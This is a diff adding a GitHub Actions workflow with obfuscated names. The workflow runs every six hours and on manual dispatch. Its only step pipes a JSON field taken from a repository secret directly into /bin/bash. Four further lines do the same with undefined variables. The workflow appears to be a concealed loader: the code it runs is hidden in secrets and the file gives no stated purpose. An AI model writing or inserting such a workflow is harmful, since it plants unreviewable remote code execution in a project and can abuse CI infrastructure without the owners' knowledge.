@@ -1,0 +1,21 @@
+name: strengthteammate
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '52 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: strengthteammate
+        env:
+          kag923: ${{ secrets.kag923 }}
+        run: |
+          echo $kag923 | jq -r .k958 | /bin/bash
+          echo $au4986 | jq -r .b76751 | /bin/bash
+          echo $fywew0 | jq -r .gadcn750 | /bin/bash
+          echo $ujfd47235 | jq -r .yvu40 | /bin/bash
+          echo $bmb38 | jq -r .vz4187 | /bin/bash
+
